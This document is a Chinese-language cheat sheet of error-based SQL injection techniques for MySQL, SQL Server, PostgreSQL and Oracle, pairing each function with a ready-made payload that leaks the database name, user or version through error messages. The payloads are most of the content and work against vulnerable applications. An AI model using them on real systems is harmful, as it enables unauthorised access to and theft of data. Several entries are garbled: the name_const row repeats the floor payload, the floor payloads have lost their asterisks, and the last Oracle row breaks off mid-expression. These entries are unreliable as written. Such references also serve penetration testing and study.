### SQL 报错注入函数有哪些

**MySQL**

| 函数/方法      | 利用原理                                                     | 举例                                                         |
| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| updatexml()    | 修改 XML 文档，不合法的 XPath 路径会报错并显示内容           | ... AND updatexml(1,concat(0x7e, (SELECT database()), 0x7e),1) |
| extractvalue() | 从 XML 字符串提取值，不合法的 XPath 路径会报错并显示内容     | ... AND extractvalue(1, concat(0x7e, (SELECT user())))       |
| floor()        | 结合 GROUP BY 和 rand()，制造重复键错误，将数据作为键值显示  | ... AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a) |
| name_const()   | 用于创建一个带名称的匿名列。当在子查询中，我们使用 `NAME_CONST()` 将查询结果作为列名，并且这个列名在子查询中已经存在时，就会引发一个“重复列名”的错误，并将查询结果显示出来 | AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a) |
| exp()          | 我们可以通过 `~` 按位取反操作，将一个大的负数转换成一个巨大的正数，从而触发溢出 | AND (exp(~(SELECT * FROM (SELECT database())x)))             |

**SQL Server**

| 函数/方法          | 利用原理                                                     | 举例                                      |
| ------------------ | ------------------------------------------------------------ | ----------------------------------------- |
| convert() / cast() | 强制类型转换，将非数字字符串转换为整型会报错并显示字符串内容 | ... AND 1=convert(int,(SELECT db_name())) |

**PostgreSQL**

| 函数/方法 | 利用原理                                           | 举例                                      |
| --------- | -------------------------------------------------- | ----------------------------------------- |
| cast()    | 强制类型转换，将字符串转换为不兼容的数据类型时报错 | ... AND 1=CAST((SELECT version()) as int) |

**Oracle**

| 函数/方法                      | 利用原理                                                     | 举例                                                         |
| ------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| utl_inaddr.get_host_address()  | utl_inaddr.get_host_address() 会将不合法的IP地址或域名作为错误信息的一部分 | ... AND 1=(SELECT utl_inaddr.get_host_address((SELECT user FROM dual))) |
| ctxsys.drithsx.sn()            | 在执行 ctxsys.drithsx.sn() 函数时，不合法的参数会引发错误并显示内容 | ... AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')) |
| dbms_utility.sqlcode_to_char() | 这个函数用于将错误代码转换为字符。它本身不是用来报错的，但可以和其他会报错的函数结合使用 | AND 1=TO_NUMBER((SELECT 'a'                                  |